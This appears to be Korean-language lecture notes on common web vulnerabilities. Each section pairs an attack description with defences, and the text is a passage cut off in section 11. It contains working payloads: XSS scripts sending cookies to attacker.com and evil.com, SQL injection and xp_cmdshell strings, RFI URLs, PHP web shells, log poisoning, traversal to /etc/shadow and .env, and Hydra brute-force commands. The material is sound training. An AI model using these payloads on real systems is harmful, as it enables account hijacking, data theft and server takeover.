# 03. 주요 웹 취약점 — 공격 & 대응

> 각 취약점: 설명 / 공격 유형 / 공격(진단) 포인트 / 해킹 시나리오 / 보안 대책

---

## 1. 크로스사이트 스크립팅 (XSS) ⭐

**설명**: 특정 페이지에 악의적 스크립트를 삽입하여 공격자가 의도한 대로 동작하게 하는 취약점.

**결과**: 사용자 정보(계좌번호·계정·패스워드) 탈취(피싱), 사용자 인증 도용, 악성코드 유포, 브라우저 무한반복. 내부 시스템의 경우 내부 PC 악성코드 감염 시도.

### XSS 유형 3가지

| 유형 | 동작 방식 | 지속성 |
|---|---|---|
| **Stored XSS** (저장형) | 악성 스크립트를 DB에 저장 → 열람 시마다 실행 | 영구 (서버에 저장) |
| **Reflected XSS** (반사형) | 파라미터에 스크립트 삽입 → 서버가 그대로 응답에 반영 | 일시적 (링크 클릭 시 1회) |
| **DOM-based XSS** | 서버 개입 없이 브라우저 DOM 조작으로 스크립트 실행 | 클라이언트 측만 |

**공격(진단) 포인트**: 사용자 입력 파라미터가 화면에 출력되는 부분 (게시판 내용·제목, 검색어 등 **모든 사용자 입력값**)

**공격 코드 예시**
```html
<!-- 기본 스크립트 실행 -->
<script>alert('XSS')</script>

<!-- 쿠키 탈취 (Stored XSS) -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

<!-- img 이벤트 핸들러 활용 (필터 우회) -->
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">

<!-- 대소문자 혼용 필터 우회 -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 인코딩 우회 -->
<script>eval(atob('YWxlcnQoJ1hTUycn'))</script>
```

**해킹 시나리오 (Stored XSS → 쿠키 탈취)**
```
① 공격자: 악성 스크립트가 삽입된 게시물을 웹 서버에 등록
   → 제목: "이벤트 당첨자 발표"
   → 내용: <script>document.location='http://evil.com/?c='+document.cookie</script>

② 일반 사용자가 해당 게시물 열람
   ↓
③ 사용자 브라우저에서 스크립트 자동 실행
   ↓
④ 사용자 세션 쿠키(JSESSIONID 등)가 공격자 서버로 전송
   ↓
⑤ 공격자가 탈취한 쿠키로 사용자 계정 도용 (세션 하이재킹)
```

**보안 대책**

| 방어 기법 | 설명 |
|---|---|
| **출력 인코딩** | HTML 특수문자를 엔티티로 변환 (가장 기본) |
| **입력값 검증** | 화이트리스트 기반 허용 문자만 허용 |
| **CSP 헤더** | `Content-Security-Policy`로 스크립트 출처 제한 |
| **HttpOnly 쿠키** | `Set-Cookie: ...; HttpOnly` → JS에서 쿠키 접근 차단 |
| **X-XSS-Protection** | `X-XSS-Protection: 1; mode=block` 헤더 설정 |

**특수문자 인코딩 테이블**

| 원문 | 변환 | | 원문 | 변환 |
|:---:|:---:|---|:---:|:---:|
| `<` | `&lt;` | | `&` | `&#38;` |
| `>` | `&gt;` | | `'` | `&#39;` |
| `(` | `&#40;` | | `"` | `&quot;` |
| `)` | `&#41;` | | `#` | `&#35;` |

### 관련 — URL 리다이렉트 변조
악성 사이트로 리다이렉트하는 URL을 생성해 링크 클릭 유도, 또는 인증토큰 발급 시 리다이렉트 도메인을 변조해 정보 도용.
```
http://www.test.com/redirect.jsp?returl=evil.com
http://www.test.com/search.jsp?query=<script src="evil.com">
```
**대응**: 리다이렉트/포워드 시 URL 파라미터 미포함, returnURL이 **WhiteList** 내 정의된 URL인지 검증.

💬 **강사 보충**
> Stored XSS가 가장 위험하다. 공격자가 게시글 하나만 올리면 게시글을 보는 모든 사용자가 피해를 입는다.
> HttpOnly 쿠키만 설정해도 document.cookie 탈취는 막을 수 있다 — 하지만 스크립트 실행 자체를 막진 못하므로 인코딩이 병행돼야 한다.
> CSP(Content-Security-Policy) 헤더는 현대적 방어법 — `script-src 'self'`만 설정해도 외부 스크립트 로딩을 차단.

## 2. SQL 인젝션 ⭐

**설명**: 입력 파라미터 유효성을 점검하지 않아 DB 쿼리 로직이 변경되어 중요 정보 유출(계정정보) 또는 DB 변경을 가하는 공격.

**공격(진단) 포인트**: 게시판 view/write/edit 시 쿼리에 포함되는 파라미터, 첨부파일 다운로드 시 파라미터

### SQL 인젝션 유형

| 유형 | 설명 | 특징 |
|---|---|---|
| **Error-based** | 의도적 오류 발생 → 오류 메시지로 DB 정보 추출 | 오류 메시지가 노출될 때 |
| **UNION-based** | UNION SELECT로 다른 테이블 데이터 추출 | 컬럼 수·타입 맞춰야 함 |
| **Blind Boolean** | 참/거짓 결과 차이로 1비트씩 데이터 추출 | 화면 반응이 있어야 함 |
| **Blind Time-based** | `SLEEP()`으로 응답 지연 발생 → 데이터 추출 | 화면 반응 없어도 가능 |
| **Stacked Queries** | `;`로 다중 쿼리 실행 → DROP, INSERT 등 | DBMS 종류 제한 있음 |

**공격 코드 예시**
```sql
-- 취약 판정 (Boolean)
/view.jsp?mbr_id=xx' and 1=2--    ← 거짓: 결과 없음
/view.jsp?mbr_id=xx' and 1=1--    ← 참: 결과 정상 → 취약!

-- 인증 우회
SELECT * FROM member WHERE id='' OR 1=1 # AND pass='1234';
--                                ↑ 항상 참  ↑ # 이후 주석처리

-- UNION-based 정보 추출 (컬럼 수 파악 후)
' UNION SELECT null, table_name, null FROM information_schema.tables--
' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='member'--
' UNION SELECT null, id, password FROM member--

-- Time-based Blind (MySQL)
' AND SLEEP(5)--                   ← 5초 지연 → 취약
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--

-- 시스템 명령 (MSSQL xp_cmdshell)
'; EXEC xp_cmdshell('whoami')--
```

**해킹 시나리오 (UNION-based 계정 탈취)**
```
① 컬럼 수 파악
   ' ORDER BY 1--  (정상)
   ' ORDER BY 2--  (정상)
   ' ORDER BY 3--  (오류) → 컬럼 2개
   ↓
② 출력 컬럼 확인
   ' UNION SELECT 'A','B'--  → 화면에 A 또는 B 출력 위치 파악
   ↓
③ DB 정보 추출
   ' UNION SELECT table_name, null FROM information_schema.tables--
   ↓
④ 계정 탈취
   ' UNION SELECT id, password FROM member--
```

**보안 대책**

| 방어 기법 | 설명 | 우선순위 |
|---|---|---|
| **Prepared Statement** (파라미터 바인딩) | 쿼리 구조와 데이터 분리 — SQL Injection 원천 차단 | ⭐ 최우선 |
| **입력값 필터링** | `'` `"` `--` `#` `;` `UNION` `SELECT` 등 차단 | 보조 수단 |
| **최소 권한 DB 계정** | 웹앱 DB 계정은 SELECT만, DROP/EXEC 권한 제거 | 피해 최소화 |
| **오류 메시지 숨김** | DB 오류를 사용자에게 노출하지 않음 | Error-based 차단 |
| **WAF** | 웹방화벽으로 알려진 SQL Injection 패턴 차단 | 추가 방어 |

**Prepared Statement 예시 (Java)**
```java
// 취약한 코드 (문자열 직접 연결)
String query = "SELECT * FROM member WHERE id='" + id + "' AND pass='" + pass + "'";

// 안전한 코드 (Prepared Statement)
String query = "SELECT * FROM member WHERE id=? AND pass=?";
PreparedStatement ps = conn.prepareStatement(query);
ps.setString(1, id);
ps.setString(2, pass);
```

**필터링 대상 문자**: `'` `"` `=` `<` `>` `(` `)` `union` `select` `drop` `sp_` `xp_` `cmdshell` `--` `#` `;` `%` `\`

💬 **강사 보충**
> Prepared Statement 하나로 SQL Injection은 99% 막힌다. 입력값 필터링은 보조 수단이고 혼자로는 불충분.
> Time-based Blind는 화면에 아무것도 안 바뀌는 것처럼 보여도 취약할 수 있다 — 응답 시간 차이를 본다.
> sqlmap 도구가 위 모든 유형을 자동화해서 시도한다.

## 3. 불충분한 인가 ⭐

**설명**: 파라미터 값이나 히든 필드를 위조/변조하여 타인의 개인정보 열람·수정, 결제금액 변경 등을 할 수 있는 취약점.
유추 가능한 값(ID, MDN, 주문번호 등)을 인증에 사용할 경우 파라미터 조작으로 타인 정보 열람·수정 가능.

### 공격 유형

| 유형 | 설명 | 예시 |
|---|---|---|
| **IDOR** (Insecure Direct Object Reference) | 객체 참조값 변조로 타인 자원 접근 | `user_id=123` → `user_id=124` |
| **히든 필드 변조** | HTML hidden input 값 수정 | 결제금액 `price=10000` → `price=100` |
| **수평적 권한 상승** | 동급 사용자의 데이터에 무단 접근 | 내 주문 조회 → 타인 주문 조회 |
| **수직적 권한 상승** | 하위 권한 사용자가 상위 기능 접근 | 일반 유저가 관리자 페이지 접근 |

**공격(진단) 포인트**: URL 파라미터·히든 필드에 포함된 사용자 식별값

**공격 코드 예시**
```
# IDOR - 내 정보만 보여야 하는데 타인 정보 조회
GET /mypage?user_id=1001          ← 내 계정
GET /mypage?user_id=1002          ← 타인 계정 (서버에서 권한 검증 안 할 때)

# 주문 조회
GET /order?order_id=ORDER_20240101_001
GET /order?order_id=ORDER_20240101_002  ← 순번 변조

# 히든 필드 변조 (Burp Suite로 intercept)
POST /payment
price=100&item_id=5&qty=1         ← price를 10000→100으로 변조
```

**해킹 시나리오**
```
① 공격자가 본인 마이페이지 URL 확인
   https://target.com/mypage?user_id=1001

② Burp Suite로 요청 가로채기
   user_id=1001 → user_id=1002 변조 후 전송

③ 서버가 세션 사용자와 user_id 불일치 검증 없이 응답
   → 타인 개인정보(이름, 연락처, 주소) 노출

④ 반복 조작으로 전체 회원 정보 탈취 (자동화 가능)
```

**대응방안**

| 방어 기법 | 설명 |
|---|---|
| **서버 사이드 권한 검증** | 세션의 로그인 사용자 ID와 요청 리소스 소유자 일치 여부 항상 검증 |
| **간접 참조 사용** | 순번/PK 대신 UUID, 해시값 등 예측 불가 값으로 참조 |
| **히든 필드 미사용** | 가격·등급 등 중요 값은 파라미터로 받지 말고 서버 DB에서 직접 조회 |
| **2-Factor / 2-Channel 인증** | 결제·회원정보 수정 등 중요 기능은 추가 인증 필수 |

```java
// 취약한 코드 - 파라미터 user_id를 그냥 사용
String userId = request.getParameter("user_id");
String sql = "SELECT * FROM member WHERE user_id = ?";

// 안전한 코드 - 세션의 사용자 ID와 비교 검증
String sessionUserId = (String) session.getAttribute("user_id");
if (!sessionUserId.equals(request.getParameter("user_id"))) {
    response.sendError(403, "Forbidden");
    return;
}
```

💬 **강사 보충**
> IDOR는 OWASP Top 10에서 꾸준히 상위권에 오르는 취약점. 실무에서 버그바운티 1위 유형.
> 히든 필드는 개발자 눈에만 숨겨진 것 — 브라우저 개발자 도구나 Burp Suite로 즉시 확인/변조 가능.
> 수직적 권한 상승은 URL 직접 입력만으로도 가능 (`/admin/users` 접근 시도).

## 4. 경로 추적 (Path Traversal / File Inclusion) ⭐

**설명**: 파일 경로 검증 없이 사용자 입력을 경로에 직접 사용할 때, `../` 등으로 허용 범위 밖의 파일에 접근하거나 악성 스크립트를 포함시켜 실행하는 취약점.

### 공격 유형

| 유형 | 설명 | 예시 |
|---|---|---|
| **Path Traversal** | `../`로 상위 디렉터리 접근 → 시스템 파일 열람 | `/etc/passwd`, `win.ini` |
| **LFI** (Local File Inclusion) | 로컬 파일을 include → 소스 유출 또는 코드 실행 | `?page=../../etc/passwd` |
| **RFI** (Remote File Inclusion) | 외부 URL을 include → 원격 악성코드 실행 | `?page=http://evil.com/shell.php` |

**공격 코드 예시**
```
# Path Traversal (리눅스)
http://target.com/download?file=../../etc/passwd
http://target.com/download?file=../../etc/shadow
http://target.com/download?file=../../../var/www/html/config.php

# Path Traversal (윈도우)
http://target.com/download?file=..\..\Windows\win.ini
http://target.com/download?file=..\..\boot.ini

# 인코딩 우회
../   →  %2e%2e%2f  또는  %2e%2e/  또는  ..%2f
../   →  ..%5c  (Windows \)
../   →  ....//  (필터 우회: ..// 제거 후 남는 ../)

# LFI
http://target.com/index.php?page=../../etc/passwd
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php

# RFI
http://target.com/index.php?page=http://evil.com/webshell.php
```

**해킹 시나리오 (LFI → 웹쉘 실행)**
```
① /etc/passwd로 경로 추적 취약점 확인

② LFI + 로그 포이즈닝(Log Poisoning) 기법:
   - Apache access.log에 웹쉘 코드 삽입
   GET /<?php system($_GET['cmd']); ?> HTTP/1.1

③ LFI로 로그 파일을 include
   ?page=../../../../var/log/apache2/access.log

④ cmd 파라미터로 시스템 명령 실행
   ?page=...access.log&cmd=whoami
```

**보안 대책**

| 방어 기법 | 설명 |
|---|---|
| **경로 정규화 후 검증** | `realpath()` 등으로 정규화 후 허용 디렉터리 내 경로인지 확인 |
| **화이트리스트** | include할 수 있는 파일 목록을 코드에 직접 정의 |
| **특수문자 필터링** | `../` `..\` `%2e` `%00` (null byte) 등 제거 |
| **php.ini 설정** | `allow_url_include = Off`, `allow_url_fopen = Off` (PHP) |
| **chroot / 컨테이너** | 웹서버 루트를 가상 루트로 격리 |

```php
// 취약한 코드
include($_GET['page'] . '.php');

// 안전한 코드 (화이트리스트)
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (!in_array($page, $allowed)) {
    $page = 'home';
}
include($page . '.php');
```

💬 **강사 보충**
> `../` 필터링만 해도 기본은 막히지만, URL 인코딩(`%2e%2e%2f`)이나 이중 인코딩으로 우회할 수 있다.
> PHP 환경에서 RFI는 `allow_url_include = Off` 하나로 막히는 경우가 많다 — 기본 Off이지만 확인 필수.
> null byte 취약점: `?file=../../etc/passwd%00.jpg` → PHP 5.3 미만에서 확장자 `.jpg`를 무시하고 passwd를 읽음.

## 5. 파일 업로드 ⭐

**설명**: 확장자·MIME 타입 검증이 없거나 우회가 가능하여 악성 파일(웹쉘)을 업로드하고 실행할 수 있는 취약점.

**공격(진단) 포인트**: 게시판 첨부파일, 이미지 삽입 박스, 동영상 첨부, 프로필 이미지 업로드

### 필터 우회 기법

| 우회 방법 | 설명 | 예시 |
|---|---|---|
| **확장자 대소문자** | 대소문자 혼용으로 필터 우회 | `shell.PhP`, `shell.PHP` |
| **이중 확장자** | 허용 확장자 뒤에 실행 확장자 추가 | `shell.jpg.php`, `shell.php.jpg` |
| **MIME 타입 변조** | Content-Type 헤더를 image/jpeg 등으로 변조 | Burp Suite로 변경 |
| **널바이트 삽입** | 확장자 뒤 null byte 삽입 | `shell.php%00.jpg` |
| **특수문자 확장자** | `;` `:` 등 특수문자로 필터 우회 | `shell.asp;.jpg` (IIS) |
| **파일 내용 우회** | 이미지 파일에 PHP 코드 삽입 (이미지 헤더 유지) | GIF 헤더 + `<?php system($_GET['cmd']);?>` |

**웹쉘 예시**
```php
# 기본 웹쉘 (PHP)
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php passthru($_POST['c']); ?>

# 업로드된 웹쉘 사용
http://target.com/uploads/shell.php?cmd=whoami
http://target.com/uploads/shell.php?cmd=cat+/etc/passwd
http://target.com/uploads/shell.php?cmd=ls+-la+/var/www/html/
```

**해킹 시나리오**
```
① 확장자 .php 파일 직접 업로드 시도 (차단되면 우회 기법 사용)
   - shell.PHP  / shell.php5 / shell.phtml / shell.php.jpg

② Burp Suite로 파일 업로드 요청 가로채기
   Content-Type: application/x-php → image/jpeg 변조

③ 업로드 성공 후 파일 경로 파악
   - 오류 메시지 / 응답 JSON / 소스코드에서 업로드 경로 확인
   - /uploads/, /board/files/, /attach/ 등 일반적 경로 추측

④ 웹쉘 URL 직접 접근
   http://target.com/uploads/shell.php?cmd=id

⑤ 서버 장악 → 내부 시스템·DB 접근
   cmd=find / -name "*.conf" 2>/dev/null
   cmd=cat /var/www/html/config/database.php
```

**보안 대책**

| 방어 기법 | 설명 |
|---|---|
| **화이트리스트 확장자** | `.jpg`, `.png`, `.pdf` 등 허용 목록만 통과 (블랙리스트 X) |
| **대소문자 무시 검증** | 확장자 검증 시 `.toLowerCase()` 적용 |
| **파일 내용 검증** | Magic Byte(파일 시그니처)로 실제 파일 형식 확인 |
| **파일명 랜덤화** | 업로드 시 파일명을 UUID 등 무작위값으로 변경 |
| **업로드 디렉터리 격리** | document root 외부에 저장, 직접 URL 접근 불가 |
| **실행 권한 제거** | 업로드 디렉터리에 `.htaccess`로 PHP 실행 차단 |

```apache
# .htaccess — 업로드 디렉터리의 PHP 실행 차단
<Directory "/var/www/html/uploads">
    php_flag engine off
    Options -ExecCGI
    RemoveHandler .php .php5 .phtml .cgi
    AddType text/plain .php .php5 .phtml
</Directory>
```

💬 **강사 보충**
> 파일 업로드는 성공하면 바로 서버 장악으로 이어지는 고위험 취약점. 확장자 검증은 클라이언트 측만으론 의미 없고 반드시 서버 측에서 해야 한다.
> `GIF89a<?php system($_GET['cmd']); ?>` — GIF 헤더를 붙이면 파일 내용 검사도 우회하는 경우가 있다.
> 업로드 경로를 웹에서 직접 접근 불가한 곳에 두고, 다운로드 시 서버가 스트림으로 전달하는 방식이 가장 안전.

## 6. 파일 다운로드

**설명**: 다운로드 파라미터 검증이 없어 소스파일·시스템 파일을 다운로드할 수 있는 취약점. 경로 파라미터에 `../` 삽입으로 허용 범위 밖 파일 다운 가능.

**공격(진단) 포인트**
```
# 파일명/경로가 파라미터로 노출되는 경우
http://target.com/download.asp?path=/board/download/&filename=report.pdf
http://target.com/file.do?fn=notice.hwp
http://target.com/attach?seq=1234
```

**공격 코드 예시**
```
# 직접 경로 변조
?path=../../etc/&filename=passwd
?path=/board/download/&filename=../../../../etc/shadow
?fn=../config/database.xml

# 소스코드 유출
?path=../../inc/&filename=dbconn.inc        ← DB 접속정보
?path=../../&filename=web.config            ← (IIS) DB 비밀번호
?path=../../&filename=.env                  ← 환경변수 (DB, API Key)

# 인코딩 우회
?filename=%2e%2e%2fetc%2fpasswd
?filename=..%2fconfig%2fdatabase.php
```

**해킹 시나리오**
```
① 파일 다운로드 기능에서 파라미터 확인
   /download.do?path=/files/&filename=manual.pdf

② filename 파라미터 변조
   filename=../../../etc/passwd
   → 오류 없이 파일 다운로드 → 취약

③ DB 접속정보 탈취
   filename=../../../../var/www/html/inc/config.php
   → 소스코드 내 ID/PW 획득

④ DB 직접 접속 → 전체 데이터 탈취
```

**보안 대책**

| 방어 기법 | 설명 |
|---|---|
| **키 값 참조 방식** | 파일 경로 대신 DB PK나 해시값을 파라미터로 사용 |
| **경로 정규화 + 화이트리스트** | 허용된 업로드 디렉터리 내 파일인지 검증 |
| **특수문자 필터링** | `../` `..\` `./` `%2e` `%00` 제거 |
| **파일 목록 화이트리스트** | 다운로드 가능 파일 목록을 DB에서 관리 |

```java
// 취약한 코드
String filename = request.getParameter("filename");
File file = new File("/app/uploads/" + filename);

// 안전한 코드
String filename = request.getParameter("filename");
File file = new File("/app/uploads/" + filename);
String canonicalPath = file.getCanonicalPath();  // 경로 정규화
if (!canonicalPath.startsWith("/app/uploads/")) {
    response.sendError(403, "Forbidden");
    return;
}
```

💬 **강사 보충**
> `.env` 파일과 `config.php`는 DB/API 자격증명이 들어있어서 다운로드 취약점의 최우선 타깃.
> `getCanonicalPath()` 또는 Python의 `os.path.realpath()`로 정규화하면 `../` 우회를 막을 수 있다.

## 7. 취약한 접근 통제 관리

**설명**: 패스워드 정책 미흡, 취약한 복구 프로세스, 자동화 공격 대응 부재로 계정을 탈취당할 수 있는 취약점.

### 취약점 유형

| 유형 | 설명 |
|---|---|
| **브루트 포스** | 가능한 모든 패스워드 조합 반복 시도 |
| **딕셔너리 공격** | 일반적 단어 목록으로 패스워드 추측 |
| **크리덴셜 스터핑** | 다른 사이트에서 유출된 ID/PW로 로그인 시도 |
| **취약한 패스워드 복구** | 보안 질문 답변 추측, 이메일 링크 재사용 등 |
| **계정 열거** | 로그인 실패 메시지로 유효 계정 존재 여부 파악 |

**공격 코드 예시 (Hydra 브루트 포스)**
```bash
# HTTP Form 브루트 포스
hydra -L users.txt -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# SSH 브루트 포스
hydra -l admin -P rockyou.txt ssh://target.com

# Burp Suite Intruder — 패스워드 파라미터를 Payload로 설정
```

**보안 대책**

| 방어 기법 | 설명 |
|---|---|
| **계정 잠금** | 로그인 N회 실패 시 잠금 (예: 5회 실패 → 30분 잠금) |
| **CAPTCHA** | 자동화 공격 차단 (로그인 실패 3회 이상 시 표시) |
| **MFA (다중 인증)** | OTP, SMS 인증 등 추가 인증 요소 |
| **패스워드 정책** | 8자 이상, 대소문자+숫자+특수문자 조합 강제 |
| **Rate Limiting** | 동일 IP에서 과도한 요청 시 차단 |
| **비밀번호 해시 저장** | bcrypt, Argon2로 해시화 (MD5·SHA1 금지) |
| **안전한 복구 프로세스** | 복구 링크 1회성·시간제한, 보안 질문 지양 |

```python
# 취약한 패스워드 저장 (MD5)
import hashlib
pw_hash = hashlib.md5(password.encode()).hexdigest()  # 위험!

# 안전한 패스워드 저장 (bcrypt)
import bcrypt
pw_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
```

💬 **강사 보충**
> MD5/SHA1 해시는 rainbow table로 수초 내 역산 가능 — bcrypt나 Argon2 사용해야 한다.
> 계정 잠금은 서비스 거부(DoS)로 악용될 수 있다 — IP 기반 잠금과 병행 또는 CAPTCHA로 대체하는 경우도 있음.
> 크리덴셜 스터핑은 사이트 자체 취약점이 아니라 다른 사이트 유출 데이터가 원인 → MFA가 유일한 실질 방어.

## 8. 정보 누출 / 관리자 페이지 노출

**설명**: 오류 메시지, 서버 헤더, 디렉터리 목록 등을 통해 공격에 활용 가능한 시스템 정보가 노출되거나, 관리자 페이지가 외부에 직접 접근 가능한 취약점.

### 정보 누출 유형

| 유형 | 노출 정보 | 공격 활용 |
|---|---|---|
| **서버 헤더** | `Server: Apache/2.2.3`, `X-Powered-By: PHP/5.3.1` | 버전별 취약점 탐색 |
| **오류 메시지** | DB 오류, 스택 트레이스, 경로 정보 | SQL Injection 힌트 |
| **디렉터리 인덱싱** | 파일 목록 노출 | 소스·설정파일 다운로드 |
| **주석 내 정보** | 개발자 주석에 DB 정보, 테스트 계정 | 직접 탈취 |
| **백업/임시 파일** | `.bak`, `.old`, `.swp` 등 | 소스코드 유출 |
| **관리자 페이지** | `/admin/`, `/manager/`, `/console/` | 무단 관리자 접근 |

**공격(진단) 포인트**
```bash
# 서버 버전 확인
curl -I http://target.com

# 디렉터리 인덱싱 확인
http://target.com/uploads/      ← 파일 목록 보이면 취약

# 백업 파일 추측
http://target.com/index.php.bak
http://target.com/config.php~
http://target.com/.config.php.swp  ← vi 스왑 파일

# 관리자 페이지 사전(Dictionary) 탐색
gobuster dir -u http://target.com -w /usr/share/wordlists/admin-pages.txt
# 탐색 대상: /admin, /administrator, /manager, /admin.php, /wp-admin 등

# robots.txt 확인 (비공개 경로 힌트)
http://target.com/robots.txt
```

**노출된 오류 메시지 예시**
```
# DB 오류 노출 (공격자가 쿼리 구조 파악 가능)
ORA-00933: SQL command not properly ended
    at oracle.jdbc.driver.OracleStatement...

# 스택 트레이스 노출
java.sql.SQLException: Table 'shopdb.members' doesn't exist
    at com.mysql.jdbc.exceptions...
    at com.example.UserDAO.login(UserDAO.java:45)
```

**보안 대책**

| 방어 기법 | 설명 |
|---|---|
| **서버 버전 헤더 제거** | `ServerTokens Prod` (Apache), `server_tokens off` (nginx) |
| **오류 페이지 커스텀화** | 공통 오류 페이지로 이동, 기술 정보 미포함 |
| **디렉터리 인덱싱 비활성화** | `Options -Indexes` (Apache) |
| **백업 파일 삭제** | `.bak`, `.old`, `.swp`, `~` 파일 웹 루트 외부로 이동 |
| **관리자 페이지 IP 제한** | 내부 IP 또는 VPN 경유만 접근 허용 |
| **robots.txt 노출 주의** | 비공개 경로를 robots.txt에 기재하지 않음 |

```apache
# Apache — 서버 버전 숨김 + 디렉터리 인덱싱 비활성화
ServerTokens Prod
ServerSignature Off
Options -Indexes

# 관리자 페이지 IP 제한
<Location /admin>
    Order deny,allow
    Deny from all
    Allow from 192.168.1.0/24
</Location>
```

💬 **강사 보충**
> `curl -I`로 서버 헤더만 봐도 운영체제, 웹서버 종류, 버전까지 나오는 경우가 많다 — 공격자가 제일 먼저 하는 정찰.
> robots.txt는 검색엔진 수집을 막으려고 만든 파일인데, 오히려 `/admin`, `/backup` 같은 경로를 공개해서 힌트가 되는 역설적 상황이 많다.

## 9. 취약한 인증 및 세션 관리 ⭐

**설명**: 인증 정보(쿠키, 세션 ID)를 탈취하거나 예측·고정하여 정당한 사용자로 위장하는 취약점.

### 세션·쿠키 관련 공격 유형

| 공격 | 설명 |
|---|---|
| **쿠키 변조** | 쿠키값(권한, 로그인 여부) 직접 수정 |
| **세션 하이재킹** | 탈취한 세션 ID로 피해자 세션 도용 |
| **세션 예측** | 순차적·단순한 세션 ID 발급 시 예측 가능 |
| **세션 고정(Session Fixation)** | 공격자가 미리 세션 ID를 피해자에게 지정 → 로그인 후 동일 ID 재사용 |
| **불충분한 세션 만료** | 로그아웃해도 서버에서 세션이 유효 |
| **중복 로그인 허용** | 동일 계정으로 여러 기기 동시 로그인 허용 |

**공격 코드 예시**
```
# 쿠키 변조 (브라우저 개발자 도구 또는 Burp Suite)
isAdmin=false → isAdmin=true
role=user → role=admin
user_id=1001 → user_id=1  (관리자 계정)

# 세션 고정 공격
① 공격자가 세션 ID 획득: PHPSESSID=abc123
② 피해자에게 링크 전달: http://target.com/login?PHPSESSID=abc123
③ 피해자가 해당 세션으로 로그인
④ 공격자는 PHPSESSID=abc123으로 피해자 계정 접근

# 세션 하이재킹 (XSS와 연계)
<script>document.location='http://evil.com/?s='+document.cookie</script>
→ 피해자 JSESSIONID 탈취 → 공격자 브라우저 쿠키에 삽입 → 피해자 계정 접근
```

**보안 대책**

| 방어 기법 | 설명 |
|---|---|
| **Server Side Session** | 인증 정보는 쿠키가 아닌 서버 메모리/DB에 저장 |
| **로그인 후 세션 재발급** | 인증 성공 시 새 세션 ID 발급 (세션 고정 방어) |
| **Secure + HttpOnly 쿠키** | `Set-Cookie: ...; Secure; HttpOnly` |
| **세션 만료 시간 설정** | 비활동 30분 후 자동 만료 |
| **고유 세션 키 생성** | `Hash(TimeStamp + IP + UserID + Random Token)` |
| **중복 로그인 차단** | 새 로그인 시 기존 세션 무효화 |
| **IP 바인딩** | 세션과 접속 IP를 연결, IP 변경 시 재인증 요구 |

```java
// 세션 ID 생성 예시 (고유 키 포함)
String key = timestamp + "|" + ipAddr + "|" + userId + "|" + randomToken;
String sessionId = DigestUtils.sha256Hex(key);
session.setAttribute("session_id", sessionId);

// 로그인 성공 후 세션 재발급 (세션 고정 방어)
HttpSession oldSession = request.getSession(false);
if (oldSession != null) oldSession.invalidate();
HttpSession newSession = request.getSession(true);  // 새 세션 ID 발급
```

💬 **강사 보충**
> `isAdmin=false`를 쿠키에 저장하면 개발자 도구에서 바로 `true`로 바꿀 수 있다 — 인증·권한 정보는 절대 쿠키에 저장하면 안 된다.
> 세션 고정 공격은 로그인 성공 시 세션 ID를 새로 발급하는 것 하나로 막힌다.
> `Secure` 속성 없는 쿠키는 HTTP(비암호화) 구간에서 스니핑으로 탈취 가능.

## 10. 중요 정보 저장/전송 미흡

**설명**: 비밀번호·개인정보·결제정보 등을 평문으로 저장하거나 전송하여 스니핑·DB 탈취 시 즉시 노출되는 취약점.

### 취약점 유형

| 유형 | 설명 | 위험 |
|---|---|---|
| **평문 전송** | HTTPS 미사용, HTTP로 로그인·결제 | 네트워크 스니핑으로 즉시 탈취 |
| **평문 저장** | 비밀번호를 DB에 그대로 저장 | DB 탈취 시 즉시 계정 도용 |
| **약한 해시** | MD5, SHA1로 해시화 | 레인보우 테이블로 수초 내 역산 |
| **소스코드 하드코딩** | DB 비밀번호를 코드에 직접 삽입 | 소스 유출 시 DB 탈취 |
| **로그 내 민감정보** | 비밀번호·카드번호 등이 로그에 기록 | 로그 열람자 모두 접근 가능 |

**취약한 코드 예시**
```python
# 평문 저장
cursor.execute("INSERT INTO users (id, password) VALUES (?, ?)", (user_id, password))

# MD5 해시 (약함)
import hashlib
pw_hash = hashlib.md5(password.encode()).hexdigest()
# MD5("password") = "5f4dcc3b5aa765d61d8327deb882cf99" → 레인보우 테이블로 즉시 역산

# 소스코드 하드코딩
DB_HOST = "192.168.1.10"
DB_USER = "root"
DB_PASS = "admin1234"       # 위험!
API_KEY = "sk-abc123xyz"    # 위험!
```

**안전한 코드 예시**
```python
# bcrypt 해시 저장 (안전)
import bcrypt
salt = bcrypt.gensalt(rounds=12)
pw_hash = bcrypt.hashpw(password.encode(), salt)

# 환경변수로 자격증명 분리
import os
DB_PASS = os.getenv("DB_PASSWORD")   # .env 파일 또는 비밀 관리 시스템

# 로그에서 민감정보 제외
# BAD:  logger.info(f"Login attempt: user={user}, pass={password}")
# GOOD: logger.info(f"Login attempt: user={user}")
```

**보안 대책**

| 방어 기법 | 설명 |
|---|---|
| **전송 구간 암호화** | HTTPS (TLS 1.2+) 의무화, HSTS 설정 |
| **비밀번호 해시화** | bcrypt, Argon2, scrypt 사용 (솔트 포함) |
| **민감 데이터 암호화** | 주민번호·카드번호는 AES-256으로 암호화 저장 |
| **자격증명 분리** | `.env`, Vault, AWS Secrets Manager 등 외부 관리 |
| **로그 마스킹** | 비밀번호·카드번호 로그 출력 금지 또는 마스킹 |

💬 **강사 보충**
> HTTPS를 쓰지 않으면 공공 Wi-Fi에서 Wireshark로 로그인 정보가 평문으로 보인다.
> MD5 레인보우 테이블은 인터넷에서 무료로 구할 수 있다 — crackstation.net에 MD5 해시 붙여넣기만 해도 역산됨.
> `.env` 파일을 깃허브에 실수로 올리는 사고가 매우 흔하다 — `.gitignore`에 `.env` 반드시 추가.

## 11. 부적절한 오류 처리

**설명**: 오류 발생 시 예외 메시지, 스택 트레이스, 시스템 경로, DB 정보 등을 사용자에게 그대로 노출하여 공격자가 시스템 구조 파악에 활용하는 취약점.

### 정보 누출 오류 예시

**오류 메시지에서 노출되는 정보들**
```
# DB 종류·버전·테이블명 노출
You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near ''' at line 1

# 서버 경로 노출
